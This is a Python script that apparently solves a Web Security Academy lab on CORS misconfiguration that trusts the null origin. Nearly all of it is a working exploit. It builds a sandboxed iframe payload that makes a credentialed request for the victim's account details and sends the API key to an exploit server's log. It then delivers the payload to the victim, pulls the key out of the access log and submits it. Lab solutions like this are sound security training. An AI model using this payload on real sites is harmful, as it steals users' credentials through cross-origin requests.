import re
from urllib.parse import urljoin

from web_security_academy.core.exploit_server import ExploitServer
from web_security_academy.core.logger import logger


def solve_lab(session):
    exploit_server = ExploitServer(session)

    payload = f"""
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','{urljoin(session.url, "accountDetails")}',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {{
        location='{urljoin(exploit_server.url, "log")}?key='+JSON.parse(this.responseText).apikey;
    }};
</script>"></iframe>
    """.strip()
    exploit_server.deliver_exploit_to_victim(
        "/exploit", "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8", payload
    )

    log = exploit_server.access_log()
    key = re.search(r"/log\?key=([^ ]{32})", log).group(1)
    logger.info(f"Extracted API key from exploit server log: {key}")
    session.submit_solution(key)
